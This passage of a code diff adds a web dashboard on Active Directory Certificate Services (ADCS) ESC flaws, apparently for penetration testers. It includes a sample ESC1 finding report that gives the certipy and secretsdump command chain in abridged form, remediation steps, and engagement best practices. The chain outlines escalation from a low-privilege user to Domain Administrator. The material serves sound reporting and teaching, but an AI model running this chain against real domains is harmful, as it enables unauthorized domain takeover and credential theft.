+<div class="code-block"><span class="cv">## [FINDING] ESC1 — Enrollee Supplies Subject</span>
+<span class="cv">**Date/Time:**</span> 2024-12-15 14:30 UTC
+<span class="cv">**Target:**</span> CORP.LOCAL
+<span class="cv">**Severity:**</span> Critical
+
+<span class="cv">### Affected components</span>
+- CA: CORP-CA (10.10.10.20)
+- Template: VulnUserTemplate
+- Enrollment rights: CORP\Domain Users
+
+<span class="cv">### Steps to reproduce</span>
+1. certipy find -u lowpriv@corp.local ...  [screenshot: evidence_01_certipy_find.png]
+2. certipy req -upn administrator@corp.local ...  [screenshot: evidence_02_req.png]
+3. certipy auth -pfx administrator.pfx ...  [screenshot: evidence_03_auth_hash.png]
+4. secretsdump -hashes :HASH ...  [screenshot: evidence_04_dcsync_blur.png]
+
+<span class="cv">### Impact</span>
+Any domain user can escalate to Domain Administrator by requesting a
+certificate impersonating any AD identity. Full domain compromise achieved.
+
+<span class="cv">### Evidence files</span>
+- corp.local_Certipy.txt (full enumeration output)
+- corp.local_Certipy.json
+- administrator.pfx (deleted after demonstration — do not retain)
+- session_log_20241215.txt (full terminal session)
+
+<span class="cv">### Remediation</span>
+1. Disable "Supply in the request" on VulnUserTemplate
+2. Restrict enrollment to specific service accounts
+3. Apply KB5014754 enforcement mode</div>
+</div>
+
+<div class="card" style="margin-top:8px">
+<p style="font-size:13px;font-weight:500;color:#e6edf3;margin-bottom:8px">Best practices and operational security on engagements</p>
+<div class="fix-item"><i class="ti ti-circle-check fix-icon" aria-hidden="true"></i><div>Always run <span class="inline-code">certipy find</span> and save all output files before any exploitation — if the CA goes down, you still have the enumeration data</div></div>
+<div class="fix-item"><i class="ti ti-circle-check fix-icon" aria-hidden="true"></i><div>Delete .pfx files from disk after the engagement — they are valid credentials that persist for 1–2 years</div></div>
+<div class="fix-item"><i class="ti ti-circle-check fix-icon" aria-hidden="true"></i><div>If you modify a template (ESC4), always save the original with <span class="inline-code">-save-old</span> and revert immediately after exploitation</div></div>
+<div class="fix-item"><i class="ti ti-circle-check fix-icon" aria-hidden="true"></i><div>On real engagements, request certs only for the tester's own account when demonstrating ESC — avoid requesting DA certs without explicit written client approval for that step</div></div>
+<div class="fix-item"><i class="ti ti-circle-check fix-icon" aria-hidden="true"></i><div>Log all timestamps — clients need to know exactly when exploitation occurred for their incident response timeline</div></div>
+<div class="fix-item"><i class="ti ti-circle-check fix-icon" aria-hidden="true"></i><div>If the CA is critical infrastructure, coordinate any relay attacks (ESC8) with the client team in case the relay causes service disruption</div></div>
+<div class="fix-item"><i class="ti ti-circle-check fix-icon" aria-hidden="true"></i><div>For HTB: document the flag in your notes along with the exact command chain — you'll need this for writeups and OSCP-style reports</div></div>
+</div>
+</div>`;
+
+function setActive(fn) {
+  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(btn=>{
+    const oc = btn.getAttribute('onclick');
+    if(oc && oc.includes(fn)) btn.classList.add('active');
+  });
+}
+
+function show(name) {
+  setActive(`'${name}'`);
+  const titles={overview:'ADCS ESC vulnerability dashboard',prereqs:'Prerequisites and setup',pfx:'What is a .pfx file?',certipy_only:'Certipy vs other tools — when do you need both?',flow:'Full attack flow — low-priv to domain admin',tools:'Tool reference — commands, outputs, usage',detect:'Detection and hardening',logging:'Logging, screenshots, and report writing'};
+  document.getElementById('page-title').textContent = titles[name]||name;
+  document.getElementById('page-sev').style.display='none';
+  document.getElementById('main-content').innerHTML = D[name] ? D[name]() : '';
+}
+
+function showEsc(key){
+  const e=ESCS[key];if(!e)return;
+  setActive(`'${key}'`);
+  document.getElementById('page-title').textContent=`${e.id} — ${e.name}`;
+  const sevEl=document.getElementById('page-sev');
+  sevEl.textContent=e.sev.toUpperCase();sevEl.className=`sev-pill ${e.sev}`;sevEl.style.display='';
+  const tags=e.tags.map(t=>`<span class="tag red">${t}</span>`).join('');
+  const steps=e.exploit_steps.map((s,i)=>`<li><span class="step-num">${i+1}</span><div>${s}</div></li>`).join('');
+  const fixes=e.fixes.map(f=>`<div class="fix-item"><i class="ti ti-circle-check fix-icon" aria-hidden="true"></i><div>${f}</div></div>`).join('');
+  document.getElementById('main-content').innerHTML=`
+<div class="tag-row">${tags}</div>
+<div class="section"><div class="section-title"><i class="ti ti-info-circle" aria-hidden="true"></i>Overview and how it arises</div><div class="card"><p>${e.overview}</p><p style="margin-top:8px;color:#8b949e;font-size:13px">${e.how}</p></div></div>
+<div class="section"><div class="section-title"><i class="ti ti-alert-triangle" aria-hidden="true"></i>Danger and real-world impact</div><div class="danger-box"><i class="ti ti-alert-triangle" aria-hidden="true" style="font-size:15px;flex-shrink:0;margin-top:1px"></i><div>${e.dangers}</div></div></div>
+<div class="section"><div class="section-title"><i class="ti ti-search" aria-hidden="true"></i>How to find it — enumeration commands</div><div class="code-block">${e.find}</div></div>
+<div class="section"><div class="section-title"><i class="ti ti-list-numbers" aria-hidden="true"></i>Exploitation steps</div><div class="card"><ul class="step-list">${steps}</ul></div></div>
+<div class="section"><div class="section-title"><i class="ti ti-terminal-2" aria-hidden="true"></i>Full exploitation commands with output annotations</div><div class="code-block">${e.exploit}</div></div>
+<div class="section"><div class="section-title"><i class="ti ti-shield-check" aria-hidden="true"></i>Remediation</div><div class="card">${fixes}</div></div>`;
+}
+
+show('overview');
+</script>
